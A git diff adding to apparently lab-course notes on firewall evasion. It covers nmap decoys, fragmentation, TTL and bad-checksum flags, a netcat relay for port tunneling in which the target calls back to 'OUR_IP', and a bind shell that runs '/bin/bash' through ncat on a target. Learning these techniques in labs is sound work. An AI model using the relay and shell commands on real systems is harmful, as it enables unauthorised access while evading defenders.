@@ -1,3 +1,5 @@
+__________________________________________________________________________________________________________________________________
+
 1. Evasion via Controlling the Source MAC/IP/Port
 
 nmap -sS -Pn -D 10.10.10.1,10.10.10.2,ME -F MACHINE_IP 
@@ -38,3 +40,76 @@ Fragment IP data into 8 bytes	           -f
 Fragment IP data into 16 bytes	        -ff
 Fragment packets with given MTU	     --mtu VALUE
 Specify packet length	            --data-length NUM
+
+_____________________________________________________________________________________________________________________________________
+
+3. Evasion via Modifying Header Fields
+
+nmap -sS -Pn --ttl 81 -F MACHINE_IP    --ttl
+--ip-options HEX_STRING  : Set IP options
+--badsum    wrong checksum, intentionally adding wrong checksum can sometimes bypass firewall
+
+    Evasion Approach	                           Nmap Argument
+Set IP time-to-live field	                     --ttl VALUE
+Send packets with specified IP options     	--ip-options OPTIONS
+Send packets with a wrong TCP/UDP checksum     	--badsum
+
+_______________________________________________________________________________________________________________________________________
+
+4. Evasion via Modifying Header Fields
+
+Three common firewall evasion techniques are:
+Port hopping
+Port tunneling
+Use of non-standard ports
+
+________________________________________________________________________________________________________________________________________
+
+5. Evasion Using Port Tunneling
+If the firewall is blocking outside sources to access certain ports, but also allows access to some ports directly then
+set up a nc listenere 
+sudo nc -lvnp 443 -c "ncat TARGET_SERVER 25"
+and if we have code execution then from target system execute nc OUR_IP 443 
+sudo nc -lvnp 443 -c "nc localhost 80"
+
+
+_____________________________________________________________________________________________________________________________________________
+
+6. Evasion Using Non-Standard Ports
+
+ncat -lvnp PORT_NUMBER -e /bin/bash   on target machine
+and listener on our machine nc Target_IP Port
+remener any port below 1024 needs root/sudo
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
